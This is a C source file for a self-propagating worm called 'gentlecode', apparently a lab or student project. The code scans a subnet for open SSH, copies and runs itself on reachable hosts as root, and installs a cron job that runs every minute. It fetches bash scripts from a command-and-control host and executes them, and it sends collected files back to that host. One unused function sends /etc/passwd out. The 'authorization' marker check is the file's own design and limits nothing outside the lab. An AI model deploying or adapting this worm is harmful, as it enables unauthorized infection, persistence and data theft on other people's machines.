#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <ifaddrs.h>
#include <stdbool.h>
#include <time.h>

#include "gentlecode.h"

void printAsciiArt(){
    printf("   _____            _   _       _____          _      \n");
    printf("  / ____|          | | | |     / ____|        | |     \n");
    printf(" | |  __  ___ _ __ | |_| | ___| |     ___   __| | ___ \n");
    printf(" | | |_ |/ _ \\ '_ \\| __| |/ _ \\ |    / _ \\ / _` |/ _ \\\n");
    printf(" | |__| |  __/ | | | |_| |  __/ |___| (_) | (_| |  __/\n");
    printf("  \\_____|\\___|_| |_|\\__|_|\\___|\\_____\\___/ \\__,_|\\___|\n");
    printf("\n\n");
}

char* ip_host = "192.168.100.1"; // Host

/**
* Check if the machine is the source host (If im the C2)
*/
int isSourceHost() {
    struct ifaddrs *ifaddr, *ifa;
    char ip_buffer[INET_ADDRSTRLEN];


    if (getifaddrs(&ifaddr) == -1) {
        perror("getifaddrs");
        return -1;
    }

    // https://gist.github.com/edufelipe/6108057
    for (ifa = ifaddr; ifa != NULL; ifa = ifa->ifa_next) {
        if (ifa->ifa_addr == NULL)
            continue;

        if (ifa->ifa_addr->sa_family == AF_INET) { // I check IPv4
            struct sockaddr_in *addr = (struct sockaddr_in *)ifa->ifa_addr;
            inet_ntop(AF_INET, &addr->sin_addr, ip_buffer, INET_ADDRSTRLEN);

            // I check if I'm the host
            if (strcmp(ip_buffer, ip_host) == 0) {
                freeifaddrs(ifaddr);
                return 1; 
            }
        }
    }

    freeifaddrs(ifaddr);
    return 0;
}

/** 
* Get /etc/passwd (I don't use it anymore because I want to be kind)
*/
void getPassword() {
    char command[SIZE_COMMAND];

    // In /etc/passwd

    snprintf(command, sizeof(command), "scp /etc/passwd root@%s:/tmp/test", ip_host);
    system(command);
    printf("[*] - /etc/passwd sent !\n");

}
/**
* Function to set a flag to know if the machine have done the update (get instruction.sh)
*/
void createUpdateFlag() {
    char command[SIZE_COMMAND];

    snprintf(command, sizeof(command), "touch /tmp/.update_done");
    system(command);
}

/**
* Check if the port 22 is open on the machine
* 
* @param ip : ip of the machine to check
*/
int check_port_22(const char *ip) {
    int sockfd;
    struct sockaddr_in serv_addr;


    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) {
        perror("[X] - Error during the creation of the socket TCP");
        return -1;
    }

    memset(&serv_addr, 0, sizeof(serv_addr));
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(22);  

    if (inet_pton(AF_INET, ip, &serv_addr.sin_addr) <= 0) {
        perror("[X] - Error during the conversion of the IP");
        close(sockfd);
        return -1;
    }

    if (connect(sockfd, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) == 0) {
        close(sockfd);
        return 1;
    } else {
        close(sockfd);
        return 0;
    }
}

/**
* Function to generate a randomname for my payload (instruction.sh)
*
* @param buffer : randomname at the end
* @param size : size of the random name
*/
void generateRandomNamePayload(char* buffer, size_t size) {
    char charset[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    size_t charset_size = strlen(charset);

    srand(time(NULL));

    for (size_t i = 0; i < size - 1; i++) {
        buffer[i] = charset[rand() % (sizeof(charset) - 1)];
    }
    buffer[size - 1] = '\0';
}

/**
* Colonize function to infecte machine
*
* @param ip : ip of the infected machine
* @param file : Send gentlecode my best gentle code no bad at all (of course :))
*/
void colonize(char* ip, char* file){
    char command[SIZE_COMMAND];

    snprintf(command, sizeof(command), "scp %s root@%s:/tmp/  > /dev/null 2>&1", file, ip);
    
    if(system(command) == 0){
        printf("[+] - The machine with ip %s have been infected\n", ip);
    } else {
        printf("[X] - Error during colonization\n");
    }
}
/**
* Function to remove the vaccine/worm from the infected machine
* 
* @param ip : ip of the infected machine
*/
void wormDelete(char *ip) {
    char command[SIZE_COMMAND];

    snprintf(command, sizeof(command), "ssh root@%s 'rm /tmp/.virus' > /dev/null 2>&1", ip);
    system(command);

    snprintf(command, sizeof(command), "ssh root@%s 'rm /etc/cron.d/virus' > /dev/null 2>&1", ip);
    system(command);

    snprintf(command, sizeof(command), "ssh root@%s 'rm /tmp/gentlecode' > /dev/null 2>&1", ip);
    system(command);

    printf("[*] - Vaccine removed\n");
}

/**
* Execute script on the infected machine that is my code in c compiled gentlecode
*
* @param ip : ip of the infected machine
* @param file : gentlecode (the file that I execute to infect the machine with my .sh and cron)
*/
void executeScript(char* ip, char* file){
    char command[SIZE_COMMAND];

    // execute script with ssh

    snprintf(command, sizeof(command), "ssh root@%s '/tmp/%s'  > /dev/null 2>&1", ip, file);
    if(system(command) == 0){
        printf("[+] - The machine with ip %s have executed gentlecode\n", ip);
    } else {
        printf("[X] - Error during execution of gentlecode\n");
    }
}
/**
* Scan network to check if I have some machine with :22 to infect or not
*
* @param fileToSend : my file to send to the infected machine (that like may payload :D)
*/
void scanNetwork(char *fileToSend) {
    FILE *file;
    char ip[INET_ADDRSTRLEN];

    file = fopen("autorized_ip.txt", "w");
    if (file == NULL) {
        printf("[X] - Error during writing)");
        return;
    }

    // For simple test I will scan only 5 IP because if I'm not diong that it will be to long to test.
    for (int i = 100; i <= 105; i++) {
        snprintf(ip, sizeof(ip), "192.168.100.%d", i);


        if (check_port_22(ip) == 1) {
            printf("[+] - IP %s open on port 22\n", ip);


            if(isAuthorized(ip)){
                printf("[+] - Machine authorized to be infected with ip: %s\n", ip);
                
            } else {
                printf("[X] - Machine not authorized to be infected with ip : %s\n", ip);

                if(isAlreadyColonize(ip)){ // Not authorized but already infected so I remove the vaccine
                    wormDelete(ip);
                }

                continue;
            }

            if(isAlreadyColonize(ip)){
                printf("[+] - Machine already infected ip : %s\n", ip);
                continue;
            }

            fprintf(file, "%s\n", ip);

            colonize(ip, fileToSend);
            executeScript(ip, fileToSend);

            file = fopen("infected_ip.txt", "w");
            if (file == NULL) {
                printf("[X] - Error during writing of infected machine\n");
                return;
            }

            fprintf(file, "%s\n", ip);


        }
    }
    printf("[*] - Scan network finished\n");
    fclose(file);
}
/**
* Check if I have the UUID = 0
*
* @return true if im root false otherwise
*/
bool isRoot() {
    if (getuid() == 0) {
        return true;
    } else {
        return false;
    }
}
/**
* Check if the machine is authorized to be infected with the flag "datav"
*
* @param ip : ip of the machine to check if it is authorized to be infected or not
*
* @return true if the machine is authorized false otherwise
*/
bool isAuthorized(char *ip) {
    char command[SIZE_COMMAND];

    snprintf(command, sizeof(command), "ssh root@%s 'ls /tmp/datav' > /dev/null 2>&1", ip);

    if(system(command) == 0){
        return true;
    } else {
        return false;
    }
}
/** 
* Check if this machine have been already colonize with the flag ".virus"
*
* @param ip : ip of the machine to check if it is already infected
*
* @return true if the machine is already infected false otherwise
*/
bool isAlreadyColonize(char* ip){
    char command[SIZE_COMMAND];

    snprintf(command, sizeof(command), "ssh root@%s 'ls /tmp/.virus' > /dev/null 2>&1", ip);

    if(system(command) == 0){
        return true;
    } else {
        return false;
    }
}

/*
* Create a cron on the infected machine that execute every one minute the script instruction.sh
*/
void createCron() {
    char command[SIZE_COMMAND];
    snprintf(command, sizeof(command), "echo '* * * * * root /tmp/gentlecode' > /etc/cron.d/virus");
    system(command);
}
/*
* To know that this machine have been already infected and add the new update
*
* @param nameRandom : name of the script that have been fetched
*/
void createFlag(char* nameRandom){
    char command[SIZE_COMMAND];
    snprintf(command, sizeof(command), "echo '%s' > /tmp/.virus", nameRandom);
    if(system(command) == 0){
        printf("[+] - Flag have been put\n");
    } else {
        printf("[X] - Error during the creation of the flag\n");
    }
}
/**
* Function to delete the old payload to get a new one (to not have many payload on the infected machine)
*
* @param path : path of the flag that contain the name of the old payload 
*/
void deleteOldPayload(const char* path) {
    char oldScriptName[RANDOM_NAME_SIZE];
    char command[SIZE_COMMAND];

    FILE* flagFile = fopen(path, "r");

    if(flagFile == NULL){
        printf("[X] - Error during the opening of the .virus\n");
        return;
    }

    if(fgets(oldScriptName, RANDOM_NAME_SIZE, flagFile)) {
        oldScriptName[strcspn(oldScriptName, "\n")] = '\0';

        printf("[*] - Old payload : %s\n", oldScriptName);
        snprintf(command, sizeof(command), "rm %s", oldScriptName);
        
        if(system(command) == 0){
            printf("[+] - Old payload deleted\n");
        } else {
            printf("[X] - Error during the deletion of the old payload\n");
        }
    } else {
        printf("[X] - Error during the reading of .virus to delete old payload\n");
    }

    fclose(flagFile);
}
/**
Fetch the script "instruction.sh" from the host (for example to get some update)
* 
* @host_ip: C2
* @remote_path: path of the script on the host
* @local_path: where I put on the infected machine
*/
void fetchScriptHost(const char* host_ip, const char *remote_path, const char *local_path){
    if(!isUpdateAvailable(host_ip)){
        printf("[*] - No update available yet\n");
        return;
    }
    char command[SIZE_COMMAND];

    snprintf(command, sizeof(command), "scp root@%s:%s %s", host_ip, remote_path, local_path);
    
    if(system(command) == 0) {
        printf("[+] - Script from C2 fetched \n");
        createUpdateFlag();
    }


}

/**
* Check if an update is available on C2
*
* @param host_ip : C2
*
* @return true if an update is available false otherwise
*/
bool isUpdateAvailable(const char* host_ip) {
    char command[SIZE_COMMAND];

    snprintf(command, sizeof(command), "ssh root@%s 'test -f /tmp/.update' > /dev/null 2>&1", host_ip);

    if(system(command) == 0){
        return true;
    } else {
        return false;
    }
}

/** 
* Execute "instruction.sh" script on the infected machine to gather information
* 
* @param script_path : path of the script
*/
void executeScriptBash(const char *script_path) {
    char command[SIZE_COMMAND];    
    
    
    snprintf(command, sizeof(command), "bash %s", script_path);
    if(system(command) == 0) {
        printf("[+] - Script bash executed successfully\n");
    } else {
        printf("[X] - Error during the execution of the script bash\n");
    }
}

/** 
* Get the file "datav" from the infected machine to get information about them
* 
* @param host_ip : C2
* @param file_path : path of the file on the infected machine
* @param file_out : Where to put the result on the host
*/
void informationRecovery(const char *host_ip, const char *file_path, const char* file_out) {
    char command[SIZE_COMMAND];

    snprintf(command, sizeof(command), "scp %s root@%s:/tmp/test/datav_%s > /dev/null 2>&1", file_path, host_ip, file_out);
    system(command);
}

/** 
* Function to get the hostname of the machine
*
* @param hostname : buffer that is going to have the hostname
* @param size : size of the hostname max
*/
void getHostName(char* hostname, size_t size) {

    gethostname(hostname, size);
    printf("[*] - Hostname: %s\n", hostname);
}

void getPayload(const char* path, char* randomName){
    FILE* flagFile = fopen(path, "r");

    if(flagFile == NULL){
        printf("[X] - Error during the opening of the .virus\n");
        return;
    }

    if(fgets(randomName, RANDOM_NAME_SIZE, flagFile)) {

        randomName[strcspn(randomName, "\n")] = '\0';
        printf("[*] - Payload : %s\n", randomName);
        
    } else {
        printf("[X] - Error during the reading of .virus\n");
    }

    fclose(flagFile);


}


int main(int argc, char *argv[]) {
    char hostname[HOST_NAME_SIZE];
    char randomName[RANDOM_NAME_SIZE];
    char randomNameDef[100];
    

    printAsciiArt();


    if (isSourceHost()) {
        printf("[+] - I'm the host with ip %s\n", ip_host);
        printf("[*] - Scan network\n");

        // That during the scan that I check if im authorized to infect the machine or if that one is already infected
        // with function isAuthorized and isAlreadyColonize
        scanNetwork(NAME_VIRUS);
    } else {
        bool updateAvailable = isUpdateAvailable(ip_host);
        printf("\n[+] - Machine to infect found\n");
    
        if(updateAvailable){
            // First I delete the last payload
            deleteOldPayload("/tmp/.virus");

            generateRandomNamePayload(randomName, 16);
            snprintf(randomNameDef, sizeof(randomNameDef), "/tmp/%s.sh", randomName);
            fetchScriptHost(ip_host, "/tmp/instruction.sh", randomNameDef);

            // To know that the machine have been infected and with the new update :D
            createFlag(randomNameDef);
        } else {
            // Get last script inside the infected machine because there is not update
            getPayload("/tmp/.virus", randomNameDef);
        }



        getHostName(hostname, HOST_NAME_SIZE);
        
        // Create cron to execute the script every minute
        createCron();


        executeScriptBash(randomNameDef);

        // Send information to the C2
        informationRecovery(ip_host, "datav", hostname);

    }

    return 0;
}
